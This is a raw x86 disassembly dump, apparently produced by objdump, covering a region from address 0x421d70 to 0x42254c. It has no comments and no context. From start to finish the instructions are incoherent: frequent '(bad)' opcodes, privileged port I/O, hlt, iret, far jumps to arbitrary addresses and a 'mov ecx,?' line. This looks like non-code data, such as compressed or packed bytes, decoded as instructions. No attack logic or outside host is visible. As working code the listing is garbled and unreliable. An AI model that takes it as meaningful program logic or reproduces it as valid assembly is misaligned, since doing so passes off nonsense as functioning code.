  421d70:	into   
  421d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d72:	dec    ebp
  421d73:	ins    DWORD PTR es:[edi],dx
  421d74:	push   ecx
  421d75:	les    edi,FWORD PTR [eax-0x44de2b36]
  421d7b:	xor    al,0xf1
  421d7d:	pusha  
  421d7e:	inc    esp
  421d7f:	pop    ss
  421d80:	adc    BYTE PTR [ebp-0x421925d6],0x73
  421d87:	iret   
  421d88:	pop    edx
  421d89:	xchg   edx,eax
  421d8a:	add    DWORD PTR [edx+0x5c1e34f9],0xffffff88
  421d91:	mov    edi,0x44bced
  421d96:	cmp    eax,DWORD PTR [edi]
  421d98:	jnp    0x421dd6
  421d9a:	xchg   esi,eax
  421d9b:	(bad)  
  421d9c:	fisttp QWORD PTR [edi]
  421d9e:	mov    ecx,0x52d680f9
  421da3:	ss pop ecx
  421da5:	dec    edi
  421da6:	inc    ebp
  421da7:	sub    eax,0x18f782d5
  421dac:	sub    DWORD PTR [ebp-0x512b78f9],eax
  421db2:	test   DWORD PTR [edx+0x32],ecx
  421db5:	test   DWORD PTR [ecx-0x3b0c0e02],edx
  421dbb:	adc    BYTE PTR [esi],al
  421dbd:	jbe    0x421d6b
  421dbf:	fist   WORD PTR [edi-0x63]
  421dc2:	out    dx,eax
  421dc3:	in     eax,dx
  421dc4:	(bad)  
  421dc5:	cld    
  421dc6:	mov    al,0x7f
  421dc8:	into   
  421dc9:	jge    0x421da6
  421dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dcc:	cmp    ebx,DWORD PTR [ebp-0x7c]
  421dcf:	lea    esp,[edx+0x9853599]
  421dd5:	inc    edi
  421dd6:	mov    es,ecx
  421dd8:	stos   BYTE PTR es:[edi],al
  421dd9:	pop    ds
  421dda:	rol    BYTE PTR [ecx+esi*4+0x626a579d],cl
  421de1:	loopne 0x421d96
  421de3:	cmp    al,0xc2
  421de5:	test   DWORD PTR [eax+0xa],ebx
  421de8:	cmp    esp,DWORD PTR [esi]
  421dea:	shr    BYTE PTR [ecx-0x6680e231],cl
  421df0:	cmp    dh,bh
  421df2:	add    BYTE PTR [ecx+0x61b7801a],bh
  421df8:	out    dx,al
  421df9:	dec    ecx
  421dfa:	in     eax,dx
  421dfb:	jnp    0x421dcd
  421dfd:	je     0x421ddd
  421dff:	push   0x255e1b7d
  421e04:	test   al,dl
  421e06:	sar    cl,1
  421e08:	addr16 mov edi,0x8e121a9b
  421e0e:	add    eax,0x197d763b
  421e13:	adc    bl,BYTE PTR ds:0x1e40c0c3
  421e19:	mov    dl,dl
  421e1b:	ret    0xc881
  421e1e:	(bad)  
  421e1f:	jbe    0x421e6c
  421e21:	jmp    0xafc3c8ec
  421e26:	in     al,dx
  421e27:	xchg   edx,eax
  421e28:	cwde   
  421e29:	jne    0x421dc5
  421e2b:	jns    0x421e27
  421e2d:	mov    DWORD PTR [eax+0x5958ec87],ebx
  421e33:	mov    ah,0x2
  421e35:	(bad)  
  421e36:	test   BYTE PTR [ebx],0x3
  421e39:	pop    ebp
  421e3a:	jp     0x421e42
  421e3c:	push   ss
  421e3d:	aam    0x93
  421e3f:	sbb    dl,BYTE PTR [eax-0x36]
  421e42:	xchg   DWORD PTR [esi],esp
  421e44:	call   0x7189:0xcd7d435a
  421e4b:	mov    DWORD PTR [ecx+0x2d],ebx
  421e4e:	and    cl,BYTE PTR [edi]
  421e50:	sahf   
  421e51:	and    dh,BYTE PTR [ebx+edi*2-0x49e24b4b]
  421e58:	jno    0x421e1b
  421e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e5b:	aaa    
  421e5c:	adc    DWORD PTR ds:0xe63cea2d,edx
  421e62:	push   eax
  421e63:	mov    BYTE PTR [eax+edx*4],al
  421e66:	push   edi
  421e67:	adc    dl,BYTE PTR [eax+0x1abfec19]
  421e6d:	test   al,0xdf
  421e6f:	outs   dx,DWORD PTR ds:[esi]
  421e70:	(bad)  
  421e71:	fsubr  QWORD PTR [esp+eax*4]
  421e74:	lods   eax,DWORD PTR ds:[esi]
  421e75:	pushf  
  421e76:	stc    
  421e77:	adc    eax,0x37eb27d8
  421e7c:	mov    ah,0xd1
  421e7e:	push   eax
  421e7f:	fiadd  WORD PTR [edx]
  421e81:	xor    DWORD PTR [ecx],ebp
  421e83:	test   eax,0xb67b880c
  421e88:	mov    ah,0x4d
  421e8a:	mov    ch,0x45
  421e8c:	xchg   esi,eax
  421e8d:	jl     0x421e42
  421e8f:	int    0xbf
  421e91:	cmp    esp,DWORD PTR [esi+0x3e5c01a4]
  421e97:	jge    0x421edc
  421e99:	scas   al,BYTE PTR es:[edi]
  421e9a:	push   cs
  421e9b:	dec    ebx
  421e9c:	or     al,0xed
  421e9e:	mov    bl,0x20
  421ea0:	cmp    BYTE PTR ss:[ebx+0x39],ch
  421ea4:	cwde   
  421ea5:	and    BYTE PTR [esi+0x4f87e79e],bh
  421eab:	popf   
  421eac:	ror    BYTE PTR [edi+0x50905625],0x1d
  421eb3:	repz fwait
  421eb5:	adc    al,0x9d
  421eb7:	pop    ebx
  421eb8:	or     eax,0xd6c5c1d
  421ebd:	pushf  
  421ebe:	push   ecx
  421ebf:	inc    ebx
  421ec0:	and    al,0xeb
  421ec2:	test   eax,0x6049e146
  421ec7:	test   al,0x51
  421ec9:	jge    0x421f27
  421ecb:	popa   
  421ecc:	jmp    DWORD PTR [ebx]
  421ece:	pop    ecx
  421ecf:	lea    esp,ds:0x64a92ee9
  421ed5:	dec    esi
  421ed6:	test   edx,edx
  421ed8:	iret   
  421ed9:	xchg   edx,eax
  421eda:	add    ebx,ebx
  421edc:	stos   BYTE PTR es:[edi],al
  421edd:	mov    al,ds:0x5b7b20f
  421ee2:	cmp    eax,0xdb6ddda2
  421ee7:	in     al,dx
  421ee8:	out    dx,eax
  421ee9:	dec    eax
  421eea:	mov    bh,0x9e
  421eec:	retf   
  421eed:	hlt    
  421eee:	dec    edi
  421eef:	(bad)  
  421ef0:	dec    ebx
  421ef1:	cdq    
  421ef2:	sbb    al,0x55
  421ef4:	push   0x1ae61b98
  421ef9:	dec    eax
  421efa:	push   esi
  421efb:	out    0x60,eax
  421efd:	xchg   edi,eax
  421efe:	cs jmp 0x5d3:0x93b97115
  421f06:	imul   eax,DWORD PTR [ebp+0x4bfae62d],0x8f333fc9
  421f10:	xchg   ebx,eax
  421f11:	ficom  DWORD PTR [ebx]
  421f13:	jl     0x421eaf
  421f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f16:	pop    esi
  421f17:	pop    edx
  421f18:	stos   BYTE PTR es:[edi],al
  421f19:	add    bh,BYTE PTR [edi]
  421f1b:	jg     0x421eb9
  421f1d:	cld    
  421f1e:	xchg   edi,eax
  421f1f:	out    dx,eax
  421f20:	fsub   QWORD PTR [eax-0x25bd78ad]
  421f26:	inc    ebx
  421f27:	inc    esi
  421f28:	add    DWORD PTR [esi+0x7c85730d],edi
  421f2e:	loope  0x421efa
  421f30:	or     BYTE PTR [eax],dl
  421f32:	arpl   WORD PTR [edi-0x7006e000],bp
  421f38:	add    esp,edi
  421f3a:	push   cs
  421f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f3c:	and    eax,0x843e4440
  421f41:	(bad)  
  421f42:	xlat   BYTE PTR ds:[ebx]
  421f43:	sar    BYTE PTR [eax+0x69],1
  421f46:	and    esp,DWORD PTR [ebx]
  421f48:	scas   eax,DWORD PTR es:[edi]
  421f49:	or     edx,DWORD PTR [edi+0x33]
  421f4c:	jmp    0xe93af6e5
  421f51:	xor    eax,0x9bd32a58
  421f56:	or     edx,esi
  421f58:	stos   BYTE PTR es:[edi],al
  421f59:	jmp    0xf724b530
  421f5e:	sbb    eax,0x8a07e62c
  421f63:	shl    BYTE PTR [edi+0x78],0xb5
  421f67:	enter  0x7b9,0xee
  421f6b:	mov    esp,0xc1e8899
  421f70:	push   ecx
  421f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f72:	inc    dx
  421f74:	xor    DWORD PTR [edi-0xd],ebx
  421f77:	rcr    DWORD PTR [esi*2+0xdc437bc],cl
  421f7e:	pusha  
  421f7f:	out    0xfc,eax
  421f81:	mov    ecx,0xded0ce14
  421f86:	lds    ecx,FWORD PTR [ecx+0x158bab79]
  421f8c:	mov    esp,0xee52cc2a
  421f91:	into   
  421f92:	dec    esi
  421f93:	fs push cs
  421f95:	mov    ds:0x389d74e0,eax
  421f9a:	arpl   WORD PTR [ebp+0x129770d5],si
  421fa0:	enter  0xfe5c,0x1e
  421fa4:	dec    eax
  421fa5:	test   DWORD PTR [ecx+0x5a],ecx
  421fa8:	ss pop edi
  421faa:	or     ah,cl
  421fac:	cli    
  421fad:	pop    esp
  421fae:	inc    ecx
  421faf:	lock loope 0x421fd0
  421fb2:	mov    esi,0xfb77e0d7
  421fb7:	cmp    BYTE PTR [esi-0xb702660],cl
  421fbd:	arpl   sp,cx
  421fbf:	xor    BYTE PTR [ecx+0x7c],ch
  421fc2:	mov    bh,0x98
  421fc4:	dec    edi
  421fc5:	cs pop esi
  421fc7:	mov    edi,0x16aa0c32
  421fcc:	fsubr  DWORD PTR ds:0xb6d06a12
  421fd2:	mov    edi,0xd7afc4fa
  421fd7:	fdiv   DWORD PTR [edi+edi*4+0x62]
  421fdb:	cmp    edx,DWORD PTR [esi-0x59]
  421fde:	sub    BYTE PTR [ecx+0x5541ff02],0x3f
  421fe5:	pop    esp
  421fe6:	sbb    DWORD PTR [ebx-0x2],esp
  421fe9:	jnp    0x421fca
  421feb:	xchg   BYTE PTR [edx+0x4b03d8eb],dl
  421ff1:	ret    0x57bd
  421ff4:	(bad)  
  421ff5:	sbb    ebp,DWORD PTR [ebx-0x68d7134d]
  421ffb:	int3   
  421ffc:	xchg   edx,eax
  421ffd:	jle    0x422057
  421fff:	jecxz  0x421ffe
  422001:	repnz popf 
  422003:	shl    DWORD PTR ds:0x58ba0efc,cl
  422009:	push   0xd2cd3aa
  42200e:	xchg   edi,eax
  42200f:	aam    0x19
  422011:	dec    eax
  422012:	add    BYTE PTR [esi+eax*2],ch
  422015:	xchg   ebx,eax
  422016:	jp     0x421fe4
  422018:	pop    es
  422019:	aaa    
  42201a:	sub    ah,0xa
  42201d:	jl     0x422080
  42201f:	loope  0x421fea
  422021:	and    DWORD PTR ds:0x1a214caa,ebx
  422027:	icebp  
  422028:	imul   ebp,DWORD PTR [eax-0x53132793],0xa
  42202f:	rcr    bl,cl
  422031:	bound  esp,QWORD PTR [edi+0x4c]
  422034:	xor    cl,ah
  422036:	dec    ebx
  422037:	fnstcw WORD PTR [ebp-0x277ff922]
  42203d:	(bad)  
  42203e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42203f:	mov    esi,0xc09c1100
  422044:	push   ebp
  422045:	call   0x6b2e:0xd4cd75c8
  42204c:	sbb    BYTE PTR [esi],dh
  42204e:	sbb    al,0x18
  422050:	mov    ds:0x75164486,al
  422055:	int3   
  422056:	cmc    
  422057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422058:	sahf   
  422059:	loopne 0x421fe7
  42205b:	pop    edi
  42205c:	and    DWORD PTR [edx-0x5b1b01ff],0x91909952
  422066:	add    esp,esi
  422068:	and    ebx,0x79c6683b
  42206e:	mov    esi,0x8bca4ea1
  422073:	adc    al,0x7
  422075:	jl     0x4220b8
  422077:	push   0x552ccc9a
  42207c:	sub    bh,BYTE PTR es:[esp+ebx*1+0x21b869d0]
  422084:	leave  
  422085:	and    dl,BYTE PTR [eax+eiz*2-0x4024cfce]
  42208c:	out    dx,eax
  42208d:	fsubp  st(5),st
  42208f:	xor    eax,0xe9db3301
  422094:	in     eax,dx
  422095:	popa   
  422096:	ror    BYTE PTR [ebx],0xdc
  422099:	rcr    DWORD PTR [edi-0x46],cl
  42209c:	cld    
  42209d:	dec    ebp
  42209e:	adc    BYTE PTR [ecx],0x59
  4220a1:	sub    DWORD PTR [esp+eax*4],esp
  4220a4:	dec    ebp
  4220a5:	xchg   ebx,eax
  4220a6:	inc    edi
  4220a7:	push   es
  4220a8:	mov    ecx,?
  4220aa:	inc    ebx
  4220ab:	stos   BYTE PTR es:[edi],al
  4220ac:	lds    esi,FWORD PTR [esi]
  4220ae:	mov    ss,ebx
  4220b0:	in     eax,0x30
  4220b2:	in     eax,0x61
  4220b4:	xchg   edx,eax
  4220b5:	fwait
  4220b6:	xchg   ebp,eax
  4220b7:	and    DWORD PTR [ebp+0x49792167],ebp
  4220bd:	mov    edi,0x7a02dfcf
  4220c2:	inc    ebx
  4220c3:	in     eax,0x5b
  4220c5:	aas    
  4220c6:	or     eax,0x6b30b796
  4220cb:	jae    0x42212c
  4220cd:	sbb    dh,cl
  4220cf:	aad    0x7c
  4220d1:	iret   
  4220d2:	div    eax
  4220d4:	test   DWORD PTR [ebp+0x50a61c8],0x7f8ef136
  4220de:	lds    ebx,FWORD PTR [ebp+0x47bbc5fb]
  4220e4:	cdq    
  4220e5:	jnp    0x42210f
  4220e7:	in     eax,0x66
  4220e9:	(bad)  
  4220ea:	retf   0x1451
  4220ed:	pop    ecx
  4220ee:	jmp    0xd465:0xc51bf093
  4220f5:	in     al,0x66
  4220f7:	jb     0x422088
  4220f9:	xor    al,0xba
  4220fb:	imul   esp,DWORD PTR [eax*1-0x16e24980],0x4d61f80
  422106:	test   al,0x48
  422108:	adc    BYTE PTR [ebx-0x136a5765],0xae
  42210f:	shr    ebx,1
  422111:	cmp    al,al
  422113:	std    
  422114:	mov    al,ds:0xa7ad694a
  422119:	in     eax,dx
  42211a:	in     eax,0x8a
  42211c:	cmp    esi,DWORD PTR [edi]
  42211e:	mov    al,cs:0x12634f20
  422124:	cld    
  422125:	dec    ecx
  422126:	xchg   ebx,eax
  422127:	mov    esp,0x51c676f9
  42212c:	sbb    DWORD PTR [esi],esi
  42212e:	pop    ebx
  42212f:	push   esi
  422130:	jge    0x422114
  422132:	inc    esi
  422133:	lods   eax,DWORD PTR ds:[esi]
  422134:	push   ecx
  422135:	cmp    DWORD PTR [edi],edi
  422137:	in     eax,dx
  422138:	sub    DWORD PTR [ebx-0x28f71220],eax
  42213e:	xor    esi,DWORD PTR [eax-0x35584462]
  422144:	inc    ecx
  422145:	mov    al,ds:0x1550f819
  42214a:	or     al,BYTE PTR [esi]
  42214c:	lock pop esi
  42214e:	xor    eax,0xc1e48e95
  422153:	cld    
  422154:	mov    ch,0xc4
  422156:	push   edx
  422157:	retf   
  422158:	push   0xffffff9b
  42215a:	mov    ah,0x3e
  42215c:	mov    BYTE PTR [edi-0x764a3e6f],cl
  422162:	icebp  
  422163:	add    ah,BYTE PTR [edi]
  422165:	sbb    eax,0x9840698e
  42216a:	repnz cmc 
  42216c:	sub    dl,BYTE PTR [edx]
  42216e:	test   al,0x69
  422170:	mov    esp,0x1c997ce5
  422175:	jne    0x422133
  422177:	fmul   DWORD PTR ds:0xc8917b22
  42217d:	adc    esp,edi
  42217f:	push   ebp
  422180:	ret    
  422181:	loopne 0x4221b8
  422183:	sub    ch,bl
  422185:	xchg   edx,eax
  422186:	cmp    bl,0xe0
  422189:	(bad)  
  42218a:	xor    DWORD PTR [ebx],esp
  42218c:	pop    ss
  42218d:	mov    esp,0x757b85d5
  422192:	fsubr  st,st(4)
  422194:	pushf  
  422195:	int    0xf2
  422197:	adc    eax,0x5ca46ce5
  42219c:	push   ebp
  42219d:	aas    
  42219e:	pop    edi
  42219f:	pop    eax
  4221a0:	add    esp,esi
  4221a2:	(bad)  
  4221a3:	mov    BYTE PTR [ebp+0x5e],bh
  4221a6:	(bad)  
  4221a7:	or     esi,esp
  4221a9:	adc    al,0x23
  4221ab:	mov    cl,0xa3
  4221ad:	fsub   DWORD PTR [ebx]
  4221af:	sar    DWORD PTR [ebx+0x4320b70],cl
  4221b5:	dec    edx
  4221b6:	adc    eax,0xf84452d2
  4221bb:	mov    ebp,ss
  4221bd:	adc    BYTE PTR [edx-0x5d],bl
  4221c0:	mov    eax,0xa8e5b417
  4221c5:	and    eax,0xa87004db
  4221ca:	pop    ecx
  4221cb:	std    
  4221cc:	ret    
  4221cd:	ds jl  0x42217e
  4221d0:	or     edi,DWORD PTR [eax-0x30]
  4221d3:	call   0x3a90:0x1810d75e
  4221da:	sub    esi,0xb9a7244a
  4221e0:	inc    ebp
  4221e2:	lods   al,BYTE PTR ds:[esi]
  4221e3:	icebp  
  4221e4:	sar    BYTE PTR [esi-0x1787a58e],0x1
  4221eb:	jae    0x42221a
  4221ed:	jne    0x4221a4
  4221ef:	fistp  QWORD PTR [ecx]
  4221f1:	enter  0xcbba,0xe6
  4221f5:	in     eax,0xc
  4221f7:	mov    esp,DWORD PTR [ecx]
  4221f9:	mov    dl,0x64
  4221fb:	add    esp,DWORD PTR [edi]
  4221fd:	or     BYTE PTR [ebx+0x27],bl
  422200:	mov    eax,ds:0xa78b13a0
  422205:	push   ebp
  422206:	push   ecx
  422207:	push   0xb0162841
  42220c:	adc    DWORD PTR [ebx-0xd],eax
  42220f:	repnz out 0xd7,eax
  422212:	arpl   WORD PTR [eax+0x24],ax
  422215:	mov    ch,0xba
  422217:	mov    bh,BYTE PTR [ecx-0x33]
  42221a:	shl    DWORD PTR [eax+edi*1+0x55e41410],cl
  422221:	cwde   
  422222:	daa    
  422223:	out    0x31,al
  422225:	cmp    DWORD PTR [ecx-0x5d],ebp
  422228:	stos   BYTE PTR es:[edi],al
  422229:	push   edi
  42222a:	jnp    0x422258
  42222c:	jle    0x42229a
  42222e:	push   esi
  42222f:	push   esp
  422230:	mov    esi,0x34a7288e
  422235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422236:	std    
  422237:	cmp    dl,BYTE PTR [ebx]
  422239:	and    al,dh
  42223b:	add    al,dl
  42223d:	outs   dx,DWORD PTR ds:[esi]
  42223e:	mov    esp,0xcc1d98c1
  422243:	(bad)  [edx-0x8]
  422246:	int    0x8d
  422248:	enter  0x5f6e,0xcd
  42224c:	mov    esi,0x325ff7f7
  422251:	ins    DWORD PTR es:[edi],dx
  422252:	paddusw mm3,QWORD PTR [edi]
  422255:	xor    bh,BYTE PTR [ecx]
  422257:	lods   al,BYTE PTR ds:[esi]
  422258:	aaa    
  422259:	stc    
  42225a:	mov    cl,0x25
  42225c:	jge    0x4222d5
  42225e:	sbb    dl,BYTE PTR [edx-0x719da83c]
  422264:	popf   
  422265:	mov    ebx,DWORD PTR ds:[ebp-0x3d]
  422269:	pop    ecx
  42226a:	out    dx,al
  42226b:	adc    BYTE PTR [eax+esi*2+0x4945cc0e],cl
  422272:	dec    esp
  422273:	out    0x34,eax
  422275:	sub    eax,DWORD PTR [esi-0x2e]
  422278:	or     cl,dh
  42227a:	adc    eax,0x23d6b06e
  42227f:	jmp    0xc6a10724
  422284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422285:	iret   
  422286:	div    BYTE PTR [ebp+0x5f]
  422289:	pop    ecx
  42228a:	cmp    bh,ch
  42228c:	cmp    eax,0x60752fb3
  422291:	sbb    DWORD PTR [ebp-0x3d5ba3a],ecx
  422297:	jle    0x422301
  422299:	sbb    dl,dh
  42229b:	cmpxchg esi,edx
  42229e:	push   ebp
  42229f:	icebp  
  4222a0:	(bad)  
  4222a1:	out    dx,al
  4222a2:	inc    BYTE PTR [ebp-0x467ddc15]
  4222a8:	ins    DWORD PTR es:[edi],dx
  4222a9:	enter  0x4442,0x43
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x877d3edc,eax
  4222b9:	mov    cl,0x90
  4222bb:	mov    cl,0x1
  4222bd:	add    BYTE PTR [eax-0x74fffffa],cl
  4222c3:	fsubr  QWORD PTR [esi]
  4222c5:	xor    BYTE PTR [ebp-0x1cfccdf6],bl
  4222cb:	cld    
  4222cc:	pop    es
  4222cd:	fsubr  st(6),st
  4222cf:	bsf    ecx,ebx
  4222d2:	mov    cx,cx
  4222d5:	lea    eax,[ebx+0x31]
  4222d8:	(bad)  
  4222da:	mov    BYTE PTR [eax],ch
  4222dc:	das    
  4222dd:	xchg   ebx,eax
  4222de:	std    
  4222df:	xor    BYTE PTR [edi-0x1b],cl
  4222e2:	or     BYTE PTR ds:[ebp+0x622826d6],0xf4
  4222ea:	popf   
  4222eb:	lods   al,BYTE PTR ds:[esi]
  4222ec:	sub    BYTE PTR [ebx-0x33c0a613],0x74
  4222f3:	jg     0x4222fe
  4222f5:	loopne 0x42236c
  4222f7:	sub    eax,0x5efb819
  4222fc:	(bad)  
  4222fd:	rol    DWORD PTR [edi],0xfa
  422300:	push   esp
  422301:	inc    eax
  422302:	push   0xffffff9b
  422304:	cmp    eax,0x5f38a69e
  422309:	mov    ah,0x4e
  42230b:	dec    ebx
  42230c:	loopne 0x4222f3
  42230e:	and    bh,BYTE PTR [edx-0x79]
  422311:	daa    
  422312:	lods   eax,DWORD PTR ds:[esi]
  422313:	and    DWORD PTR [ebx+0x13],ebp
  422316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422317:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  422319:	loope  0x4222b7
  42231b:	out    dx,eax
  42231c:	aaa    
  42231d:	jae    0x422366
  42231f:	retf   0xe4f5
  422322:	lods   al,BYTE PTR ds:[esi]
  422323:	adc    eax,0xc73fa913
  422328:	jle    0x422377
  42232a:	jnp    0x42230d
  42232c:	cmp    eax,0x872d6c08
  422331:	jb     0x422352
  422333:	imul   esi,ebx,0x68334326
  422339:	push   esi
  42233a:	adc    eax,0x70ce9d
  42233f:	push   ss
  422340:	push   ebp
  422341:	xor    eax,0x908f1232
  422346:	out    dx,al
  422347:	imul   ebp,DWORD PTR [edi+0x51],0x2fa16d5c
  42234e:	push   ds
  42234f:	retf   0xd31b
  422352:	fwait
  422353:	popa   
  422354:	fadd   QWORD PTR [eax+0x1f]
  422357:	mov    edx,0x49fe8b93
  42235c:	test   DWORD PTR [esi+0x2d044282],0x365c8b38
  422366:	sub    dh,BYTE PTR [edi+ecx*2-0x7b1c9e7b]
  42236d:	adc    al,0xf
  42236f:	retf   
  422370:	shr    ah,0xc7
  422373:	fwait
  422374:	bound  esp,QWORD PTR [edi+0x17]
  422377:	(bad)  
  422379:	leave  
  42237a:	lds    eax,FWORD PTR [edx-0x3fc3469b]
  422380:	xchg   esp,eax
  422381:	dec    ecx
  422382:	shr    BYTE PTR [eax+esi*2-0x6c],0xde
  422387:	cvtps2pd xmm7,QWORD PTR ds:0x697c24b7
  42238e:	dec    edx
  42238f:	in     al,0xc9
  422391:	das    
  422392:	ret    
  422393:	pop    edi
  422394:	and    eax,DWORD PTR [edx+0x39]
  422397:	push   0x36
  422399:	jmp    0x7653f4aa
  42239e:	cmp    BYTE PTR [edi-0x5d2d312c],cl
  4223a4:	mov    dl,0x38
  4223a6:	adc    BYTE PTR [edi+0x41],bh
  4223a9:	sti    
  4223aa:	xchg   DWORD PTR [bp-0x7c43],ecx
  4223af:	mov    dh,0xef
  4223b1:	cmp    ecx,edi
  4223b3:	arpl   WORD PTR [eax+0x47],ax
  4223b6:	ins    BYTE PTR es:[edi],dx
  4223b7:	jge    0x422406
  4223b9:	(bad)  
  4223ba:	or     al,0x7e
  4223bc:	je     0xfe1d9937
  4223c2:	or     BYTE PTR [ecx+edi*2-0x327fc244],dh
  4223c9:	adc    ebp,DWORD PTR [eax+ebx*1-0x479d508c]
  4223d0:	retf   
  4223d1:	lods   al,BYTE PTR ds:[esi]
  4223d2:	lock and DWORD PTR [ecx],ebp
  4223d5:	scas   eax,DWORD PTR es:[edi]
  4223d6:	out    0x90,eax
  4223d8:	mov    esi,0x3f957798
  4223dd:	adc    al,BYTE PTR [edi-0x723ecb8]
  4223e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223e4:	xlat   BYTE PTR ds:[ebx]
  4223e5:	mov    ch,0x68
  4223e7:	mov    eax,0xa2057ddf
  4223ec:	xor    al,0xae
  4223ee:	popa   
  4223ef:	sub    bh,BYTE PTR [edi]
  4223f1:	xchg   ecx,eax
  4223f2:	loope  0x42239a
  4223f4:	or     edx,DWORD PTR [edi-0x10]
  4223f7:	cmp    DWORD PTR [eax],ecx
  4223f9:	push   ss
  4223fa:	int    0x71
  4223fc:	sbb    BYTE PTR [esi+0x25],bh
  4223ff:	adc    BYTE PTR [esi+0x7064e42a],0xc9
  422406:	mov    ecx,DWORD PTR [ecx+edi*8+0xf68cf59]
  42240d:	test   eax,0x5ca25dc3
  422412:	retf   
  422413:	push   ds
  422414:	out    0x56,eax
  422416:	out    0xb6,al
  422418:	mov    ch,0x18
  42241a:	jne    0x422412
  42241c:	xlat   BYTE PTR ds:[ebx]
  42241e:	sub    BYTE PTR [esi+ebp*4-0x71],al
  422422:	sahf   
  422423:	pop    ds
  422424:	xchg   edx,eax
  422425:	inc    ebx
  422426:	add    al,BYTE PTR [ebx-0x7d]
  422429:	fst    QWORD PTR [ebp-0x1]
  42242c:	jecxz  0x4223fc
  42242e:	test   al,0x2
  422430:	adc    DWORD PTR [ebx+0x75],ecx
  422433:	ins    DWORD PTR es:[edi],dx
  422434:	or     ah,0xab
  422437:	dec    ebp
  422438:	imul   ebx,DWORD PTR [ecx+0x8fa340c],0x16
  42243f:	neg    eax
  422441:	repz mov al,0x5a
  422444:	stc    
  422445:	or     eax,0xce8ba84
  42244a:	xor    eax,0xed0bb586
  42244f:	sbb    al,0x66
  422451:	mov    dh,0x15
  422453:	dec    edi
  422454:	std    
  422455:	stc    
  422456:	inc    esp
  422457:	add    DWORD PTR [edx-0x2c1d11c3],esi
  42245d:	fsub   st(2),st
  42245f:	cmp    eax,0x3e3a5136
  422464:	mov    edx,0x3d866c47
  422469:	dec    esp
  42246a:	nop
  42246b:	xor    edi,esp
  42246d:	cs sub al,0xd5
  422470:	icebp  
  422471:	pop    esp
  422472:	bound  eax,QWORD PTR [eax]
  422474:	retf   
  422475:	ror    BYTE PTR [ecx+0x39],0xcc
  422479:	mov    ch,0xb6
  42247b:	jno    0x42240d
  42247d:	and    eax,0xd12e23d
  422482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422483:	cmp    eax,edx
  422485:	pop    esp
  422486:	xor    BYTE PTR [ebx+esi*2-0x74],bh
  42248a:	cs jl  0x42250a
  42248d:	sbb    dh,ah
  42248f:	and    DWORD PTR [edx+0x30],ebp
  422492:	xor    eax,DWORD PTR [ebx-0x35]
  422495:	pop    edx
  422496:	rol    DWORD PTR [eax],cl
  422498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422499:	outs   dx,BYTE PTR ds:[esi]
  42249a:	sar    BYTE PTR [esi-0x51619a14],1
  4224a0:	fadd   QWORD PTR [edx-0x54]
  4224a3:	mov    ds:0xc1bbcc3c,al
  4224a8:	stc    
  4224a9:	pop    eax
  4224aa:	inc    ebp
  4224ab:	fcomp  st(1)
  4224ad:	mov    bl,0x4f
  4224af:	inc    ebx
  4224b0:	test   DWORD PTR [ecx+ebp*8+0x6847b886],ecx
  4224b7:	inc    eax
  4224b8:	xchg   ebp,eax
  4224b9:	jle    0x4224e9
  4224bb:	sti    
  4224bc:	inc    edx
  4224bd:	and    ecx,DWORD PTR [eax-0x88e78df]
  4224c3:	push   cs
  4224c4:	mov    ah,0xc6
  4224c6:	cld    
  4224c7:	pop    ebx
  4224c8:	pop    esi
  4224c9:	outs   dx,DWORD PTR ds:[esi]
  4224ca:	add    BYTE PTR [ecx-0x1b],al
  4224cd:	mov    edi,0xc578b4ff
  4224d2:	xchg   edi,eax
  4224d3:	int3   
  4224d4:	mov    ecx,0x3157f48f
  4224d9:	or     esp,DWORD PTR [ecx]
  4224db:	sub    DWORD PTR [ebp-0x5],0x5273fd26
  4224e2:	xchg   DWORD PTR [edx+0xbb1d63d],eax
  4224e8:	outs   dx,BYTE PTR ds:[esi]
  4224e9:	bound  edx,QWORD PTR ss:[esi+ecx*1-0x33]
  4224ee:	add    ebx,ecx
  4224f0:	in     al,0xdc
  4224f2:	lea    edx,[edx]
  4224f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f5:	(bad)  
  4224f7:	mov    ebx,0x72f8b3b4
  4224fc:	in     eax,dx
  4224fd:	pushf  
  4224fe:	jmp    0x4224ff
  422500:	pushf  
  422501:	and    edx,ecx
  422503:	sahf   
  422504:	retf   0xb419
  422507:	dec    eax
  422508:	push   ecx
  422509:	xchg   ecx,eax
  42250a:	popf   
  42250b:	les    esp,FWORD PTR [edi+esi*8]
  42250e:	or     al,0x50
  422510:	in     al,dx
  422511:	push   ds
  422512:	adc    bl,BYTE PTR [edi-0x5]
  422515:	mov    cl,BYTE PTR [esi]
  422517:	cmp    DWORD PTR [ebp-0x1b],ebp
  42251a:	popa   
  42251b:	test   al,0x1a
  42251d:	out    dx,al
  42251e:	jl     0x422505
  422520:	shr    DWORD PTR [edi-0x35],1
  422523:	(bad)
  422527:	adc    esp,edx
  422529:	test   DWORD PTR [edx+0x61],0xbc2e32b3
  422530:	lahf   
  422531:	dec    edx
  422532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422533:	rcl    BYTE PTR [ebx],1
  422535:	inc    edi
  422536:	das    
  422537:	add    BYTE PTR [edx],0x4d
  42253a:	adc    ecx,0x91abeb1a
  422540:	icebp  
  422541:	sub    eax,0x4fbcc27f
  422546:	lds    ecx,FWORD PTR ds:0x33d57ce8
  42254c:	xlat   BYTE PTR ds:[ebx]
